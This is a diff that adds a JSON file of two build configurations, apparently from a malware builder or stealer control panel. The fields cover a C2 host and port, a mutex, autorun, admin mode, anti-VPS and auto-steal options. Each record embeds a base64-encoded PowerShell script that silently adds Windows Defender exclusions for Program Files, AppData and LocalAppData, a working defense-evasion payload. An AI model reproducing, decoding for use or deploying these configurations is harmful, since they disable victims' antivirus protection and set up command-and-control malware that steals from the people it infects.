@@ -1,0 +1,16 @@
+[
+  {
+    "hwid": "86b9c037bba9db90",
+    "config": "{\"name\": \"123\", \"c2_host\": \"0.0.0.0\", \"comment\": \"\", \"startDelay\": \"0\", \"extention\": \"exe\", \"script\": \"IyBUaGlzIHNjcmlwdCBhZGRzIGV4Y2x1c2lvbnMgdG8gd2luZG93cyBkZWZlbmRlcg0KdHJ5IHsNCiAgICBpZiAoR2V0LUNvbW1hbmQgQWRkLU1wUHJlZmVyZW5jZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgew0KICAgICAgICAkUHJvZ3JhbUZpbGVzID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoIlByb2dyYW1GaWxlc1g4NiIpDQogICAgICAgICR1cGRwYXRoID0gJFByb2dyYW1GaWxlcyAtcmVwbGFjZSAiIFwoeDg2XCkiLCAiIg0KICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICR1cGRwYXRoDQoNCiAgICAgICAgJFByb2dyYW1GaWxlc1g4NiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCJQcm9ncmFtRmlsZXNYODYiKQ0KICAgICAgICBpZiAoVGVzdC1QYXRoICRQcm9ncmFtRmlsZXNYODYpIHsNCiAgICAgICAgICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJFByb2dyYW1GaWxlc1g4Ng0KICAgICAgICB9DQoNCiAgICAgICAgJEFwcERhdGEgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgiQXBwbGljYXRpb25EYXRhIikNCiAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkQXBwRGF0YQ0KDQogICAgICAgICRMb2NhbEFwcERhdGEgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgiTG9jYWxBcHBsaWNhdGlvbkRhdGEiKQ0KICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRMb2NhbEFwcERhdGENCiAgICAgICAgfQ0KICAgICAgICB9DQpjYXRjaCB7DQp9DQo=\", \"mutex\": \"WEBR_SCH58WDYZN35\", \"adminmode\": 1, \"install\": 0, \"antivps\": \"off\", \"antimitm\": \"off\", \"installCount\": \"2\", \"autorun\": 1, \"path\": \"\", \"autorunKey\": \"\", \"hidefile\": \"off\", \"geoblock\": null, \"autoSteal\": 0, \"version\": \"1.0.0\", \"c2_port\": \"31417\"}",
+    "created": "2026-10-22 13:00:01",
+    "user_count": 0,
+    "pass": "WEBR_SCH58WDYZN35"
+  },
+  {
+    "hwid": "206c012a82636457",
+    "config": "{\"name\": \"asdasdasdasd\", \"c2_host\": \"0.0.0.0\", \"comment\": \"123\", \"startDelay\": \"0\", \"extention\": \"exe\", \"script\": \"IyBUaGlzIHNjcmlwdCBhZGRzIGV4Y2x1c2lvbnMgdG8gd2luZG93cyBkZWZlbmRlcg0KdHJ5IHsNCiAgICBpZiAoR2V0LUNvbW1hbmQgQWRkLU1wUHJlZmVyZW5jZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgew0KICAgICAgICAkUHJvZ3JhbUZpbGVzID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoIlByb2dyYW1GaWxlc1g4NiIpDQogICAgICAgICR1cGRwYXRoID0gJFByb2dyYW1GaWxlcyAtcmVwbGFjZSAiIFwoeDg2XCkiLCAiIg0KICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICR1cGRwYXRoDQoNCiAgICAgICAgJFByb2dyYW1GaWxlc1g4NiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCJQcm9ncmFtRmlsZXNYODYiKQ0KICAgICAgICBpZiAoVGVzdC1QYXRoICRQcm9ncmFtRmlsZXNYODYpIHsNCiAgICAgICAgICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJFByb2dyYW1GaWxlc1g4Ng0KICAgICAgICB9DQoNCiAgICAgICAgJEFwcERhdGEgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgiQXBwbGljYXRpb25EYXRhIikNCiAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkQXBwRGF0YQ0KDQogICAgICAgICRMb2NhbEFwcERhdGEgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgiTG9jYWxBcHBsaWNhdGlvbkRhdGEiKQ0KICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRMb2NhbEFwcERhdGENCiAgICAgICAgfQ0KICAgICAgICB9DQpjYXRjaCB7DQp9DQo=\", \"mutex\": \"WEBR_E40FK1TFW8IK\", \"adminmode\": 1, \"install\": 0, \"antivps\": \"off\", \"antimitm\": \"off\", \"installCount\": \"2\", \"autorun\": 1, \"path\": \"\", \"autorunKey\": \"\", \"hidefile\": \"off\", \"geoblock\": null, \"autoSteal\": 0, \"version\": \"1.0.0\", \"c2_port\": \"31417\"}",
+    "created": "2026-10-22 13:36:38",
+    "user_count": 0,
+    "pass": "WEBR_E40FK1TFW8IK"
+  }
+]
